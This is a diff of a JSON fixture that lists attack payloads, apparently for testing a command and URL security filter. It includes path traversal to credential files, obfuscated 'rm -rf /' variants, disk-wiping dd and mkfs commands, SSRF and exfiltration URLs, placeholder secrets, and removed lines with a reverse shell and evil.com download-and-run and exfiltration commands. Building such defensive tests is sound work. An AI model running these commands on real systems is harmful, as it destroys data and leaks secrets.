@@ -1,40 +1,88 @@
 [
   {
-    "type": "path_traversal",
+    "category": "path_traversal",
+    "description": "Directory traversal attacks attempting to access root or system credentials",
     "payloads": [
       "../../../etc/passwd",
       "..\\..\\..\\Windows\\System32",
       "/workspace/../.env",
-      "/%2e%2e/%2e%2e/etc/shadow"
+      "/%2e%2e/%2e%2e/etc/shadow",
+      "/var/log/../../etc/shadow",
+      "C:\\..\\Windows\\System32\\config\\SAM"
     ]
   },
   {
-    "type": "command_injection",
+    "category": "ast_evasion_wrappers",
+    "description": "Invocation wrapper chains and obfuscations attempting to execute destructive deletions",
     "payloads": [
-      "; cat /etc/passwd",
-      "| wget http://evil.com/malware -O- | sh",
-      "`curl http://evil.com/exfil?data=$(env | base64)`",
-      "$(nc -e /bin/sh 10.0.0.1 4444)",
-      "& ping -c 10 127.0.0.1 &"
+      "sudo env nice -n 19 rm -rf /",
+      "nohup nice -n 10 rm -rf /var",
+      "timeout 30s rm -rf /etc",
+      "stdbuf -o0 rm -rf /*",
+      "pkexec rm -rf /root",
+      "\\r\\m -rf /",
+      "r\"\"m -rf /etc",
+      "\"r\"'m' -rf /var",
+      "rm$IFS-rf$IFS/",
+      "${CMD:-rm} -rf /",
+      "del /s /q C:\\",
+      "del /s /q /var"
     ]
   },
   {
-    "type": "ssrf",
+    "category": "ast_interpreter_injection",
+    "description": "Direct interpreter inline execution, redirection feeding, and subshell escapes",
+    "payloads": [
+      "python3 -c \"import os; os.system('rm -rf /')\"",
+      "bash -c \"rm -rf /\"",
+      "bash <<< \"rm -rf /\"",
+      "sh < /tmp/payload.sh",
+      "source /dev/shm/script.sh",
+      "cat app.log | python3 -c \"import os; os.system('id')\"",
+      "cat app.log | bash",
+      "cat app.log | (cat)",
+      "cat app.log | xargs sh",
+      "cat app.log | xargs rm -rf /"
+    ]
+  },
+  {
+    "category": "raw_disk_destruction",
+    "description": "Block device destruction, file wiping, and filesystem format commands",
+    "payloads": [
+      "dd if=/dev/zero of=/dev/sda bs=1M",
+      "dd if=/dev/urandom of=/dev/nvme0n1",
+      "shred -u /etc/shadow",
+      "mkfs.ext4 /dev/sda1",
+      "mkfs.xfs /dev/vda1",
+      "echo 'evil' > /dev/sda"
+    ]
+  },
+  {
+    "category": "ssrf_and_exfiltration",
+    "description": "Cloud metadata SSRF endpoints and dangerous C2 tunnel exfiltration targets",
     "payloads": [
       "http://169.254.169.254/latest/meta-data/",
       "http://127.0.0.1:22",
       "http://[::1]:80",
       "http://0x7f000001/",
       "http://localhost.evil.com",
-      "http://10.0.0.5/admin"
+      "https://tunnel.ngrok.io/exfiltrate",
+      "http://c2.evil.com/leak",
+      "https://evil.com/webhook"
     ]
   },
   {
-    "type": "data_exfiltration",
+    "category": "data_exfiltration_secrets",
+    "description": "Sensitive credentials and API keys targeted for DLP sanitization",
     "payloads": [
       "AKIAIOSFODNN7EXAMPLE",
       "sk-ant-api03-abcdef1234567890abcdef1234567890abcdef1234567890",
-      "ghp_abcdefghijklmnopqrstuvwxyz1234567890"
+      "sk-proj-abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz",
+      "ghp_abcdefghijklmnopqrstuvwxyz1234567890",
+      "AIzaSyD1234567890abcdefghijklmnopqrstuv",
+      "sk_test_51000000000000000000000000000000",
+      "xoxb-EXAMPLE000000000000000000000000",
+      "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACD99Q0bKq23L0q1v40wS8z2zQ34A==\n-----END OPENSSH PRIVATE KEY-----"
     ]
   }
 ]
